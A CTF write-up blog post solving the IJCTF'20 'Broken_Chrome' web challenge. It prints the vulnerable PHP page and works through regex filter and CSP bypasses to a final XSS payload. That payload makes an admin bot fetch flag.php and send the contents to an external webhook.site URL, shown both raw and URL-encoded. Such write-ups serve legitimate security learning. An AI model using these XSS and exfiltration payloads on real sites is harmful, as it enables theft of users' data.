---
layout: post
title: IJCTF - Broken_Chrome
excerpt: "I didn't have much time to look at this ctf but I was able to solve one web problem. This was interesting to me because I faced some difficulties in getting my payload to work and learned some concepts about the dom."
categories: [Writeups, IJCTF'20]
tags: [web]
---

I didn't have much time to look at this ctf but I was able to solve one web problem. This was interesting to me because I faced some difficulties in getting my payload to work and learned some concepts about the dom.

#### Broken_Chrome
```
read flag.php

http://34.87.80.48:31338/?view-source

http://34.87.177.44:31338/?view-source

Note: server is running on 80 port in local.

flag format: ijctf{}

Author: `sqrtrev`
```

Thankfully the challenge author has made the goal very clear. It is to read flag.php which is hosted on the webserver. Also, the source of the webpage is provided so what we need to exploit should be clear. The following is the source of the webpage.

  ```php
<?php  
if(isset($_GET['view-source'])){  
	highlight_file(__FILE__);  
	exit();  
}  
  
header("Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'");  
$dom = $_GET['inject'];  
if(preg_match("/meta|on|src|<script>|<\/script>/im",$dom))  
	exit("No Hack");  
?>  
<html>  
<?=$dom ?>  
<script>  
window.TASKS = window.TASKS || {  
proper: "Destination",  
dest: "https://vuln.live"  
}  
<?php  
if(isset($_GET['ok']))  
	echo "location.href = window.TASKS.dest;";  
?>  
</script>  
	<a href="check.php">Bug Report</a>  
</html>`
```

It is pretty clear that we are able to inject content into the dom and we should use this to visit flag.php.  If we visit check.php it tells us that it requires the parameter `?report=[url]`. This is clearly a way for the admin / local server to visit a link that we send . If we visit flag.php, it tells us that `Only localhost can access`. At this point, it is clear that what we need to do is get some injection into the dom which will get cause the admin visitor to visit flag.php and then exfil the data that is contained in that page.

The first thing I looked at was the csp which was used on the website.  The `default-src 'self'` tag makes it so that we cannot just fetch an arbitrary url. Instead, the url has to be the same as self. For example, if I visit `google.com`, the only website I can fetch is `google.com`. If I tried to visit `bing.com` I would violate the csp and my request would not fire. The other interesting part of the css is that `'unsafe-inline'` is allowed. This means we can insert script tags and have the script execute.

The next step is to look at the source code and see what we can do. The last php section echos a `location.href` into the dom which allows us to bypass the csp and redirect the viewer to any url we want. This is useful as the last step in our exploit chain after we grab data. Now all we need to figure out is what to do in order to make window.TASKS.dest into our exfil url.

One thing I tried first was some alternative methods for xss. As my primary browser, I use firefox and a payload that worked when injected into the site was `<object data="javascript:alert(XSS)">`. I spent a lot of time getting payloads which would get the data and insert it into window.TASKS.dest for exfil but it wasn't working. After I tested this in chrome browser, the xss just didn't activate the alert. I'm not sure whether the exploitation path was wrong or the xss vector just didn't work in chrome but it was an important lesson that what works in one browser might not work in another. This is my initial thoughts and although it did not work, I am sharing it because it is a way to see what will not work.

After this failed attempt, I realized that there was an easier way to bypass the filter. It was just to use `<script x>alert("XSS")</script y>` This proved to work on chrome and was how I was able to inject javascript. 

In order to get the data from flag.php and load that into window.TASKS.dest, I decided to use a fetch. Because we need to get the data from localhost, I can use `fetch("localhost/flag.php")` . This means the url I would send to admin is `localhost.com/?inject=<script x>fetch("localhost/flag.php")</script y>` and thus it would not be blocked by CSP.  My first attempt after getting the fetch to work was to override window.TASKS with my URL and it wasn't working. My payload looked something like this: `<script x>fetch("localhost/flag.php").then(r=>r.text()).then(r=>window.TASKS={dest: "webhook.site" + r})</script y>` However, after messing with this idea for some time I wasn't able to get it to work. I'm not sure why this was happening but I believe it is because the fetch is an async function and location.href was immediete upon page load. This meant that if I didn't have the `?ok` parameter and I checked for the value of window.TASKS it was correct, but I was being redirected to the wrong page. I asked the challenge author for his approach and he used XHR requests. I believe these are synchonous so the intended path to set the value of window.TASKS would work. Another important lesson I learned from this challenge was to not trust async requests.

After all these failed attempts to use the code in provided by the challenge, I realized that I could just bypass the filter to read the file. One trick in javascript is that you can call functions without a dot using brackets. For example, `window.location` can become `window["location"]`. However, `on` is still banned by the filter so we can take this one step further and use `window["locatio" + "n"]`. Now, I just combined all the steps to read the flag and send it to my webhook in order to read the flag. The final injection was `<script x>fetch("http://localhost:80/flag.php").then(r=>r.text()).then(r=>window['locatio'+'n'].assign('https://webhook.site/20f25ad1-38b7-4178-a0ab-6f60d2361ca0/' + r))</script y>` and to just not use the `ok` parameter. Finally, just send the url `http://localhost/?inject=<script x>fetch("http://localhost:80/flag.php").then(r=>r.text()).then(r=>window['locatio'+'n'].assign('https://webhook.site/20f25ad1-38b7-4178-a0ab-6f60d2361ca0/' + r))</script y>` to the bug report and this would get send the flag to my webhook. It is important to note that the URL needs to be url encoded in order to pass properly. This means our final payload looks like this ```http://34.87.80.48:31338/check.php?report=http%3A%2F%2Flocalhost%2F%3Finject%3D%3Cscript%2520x%3Efetch%2528%22http%253A%252F%252Flocalhost%253A80%252Fflag.php%22%2529.then%2528r%253D%3Er.text%2528%2529%2529.then%2528r%253D%3Ewindow%255B%2527locatio%2527%252B%2527n%2527%255D.assign%2528%2527https%253A%252F%252Fwebhook.site%252F20f25ad1-38b7-4178-a0ab-6f60d2361ca0%252F%2527%2520%252B%2520r%2529%2529%3C%252Fscript%2520y%3E``` and a few seconds later the flag will show up at our webhook.

Overall, I learned a lot about xss and what to be more careful about. The bypasses for the filter were also pretty interesting and one of the first times I did this in an active ctf so overall I thought it was a good challenge.
